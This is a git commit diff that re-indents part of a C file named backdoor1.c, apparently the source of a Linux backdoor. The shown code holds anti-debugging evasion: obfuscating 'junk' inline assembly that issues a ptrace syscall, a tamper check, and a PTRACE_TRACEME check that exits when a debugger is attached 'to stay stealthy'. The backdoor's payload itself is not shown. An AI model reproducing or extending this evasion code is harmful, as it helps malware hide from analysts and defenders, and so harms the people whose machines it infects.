885d76ea46a14a2183417b7955ac404384f25fb6
kmkz <mail.bourbon@gmail.com>
2013-03-31 21:58:01 +0300

    Update backdoor1.c

--- backdoor1.c
+++ backdoor1.c
@@ -11,17 +11,17 @@ int byte_ =(0);
 int main (void){
   
 
-	  /* Junk code asm for obfuscation (anti dbg)*/
-	  __asm__(
-		"xor %eax,%eax \012"
-		"xor %ebx,%ebx \012"
-		"xor %ecx,%ecx \012"
-		"xor %edx,%edx \012"
-		"mov %ebx,%ecx \012"
-		"inc %ecx \012"
-		"mov $0x1A, %eax \012"
-		"int $0x80 \012"
-	  );
+        /* Junk code asm for obfuscation (anti dbg)*/
+        __asm__(
+	"xor %eax,%eax \012"
+	"xor %ebx,%ebx \012"
+	"xor %ecx,%ecx \012"
+	"xor %edx,%edx \012"
+	"mov %ebx,%ecx \012"
+	"inc %ecx \012"
+	"mov $0x1A, %eax \012"
+	"int $0x80 \012"
+        );
 
 	if (byte_  != 0 ){
 	    /* Junk code modified ?? */
@@ -29,7 +29,7 @@ int main (void){
 	}
 
     
-    /* Routine anti débugg */
+        /* Routine anti débugg */
 	if((ptrace(ptrace(PTRACE_TRACEME,0,1,0) < 0)) != -1 ){
 		/* if DBG attached = exit to stay stealthy */
 		exit(EXIT_FAILURE);
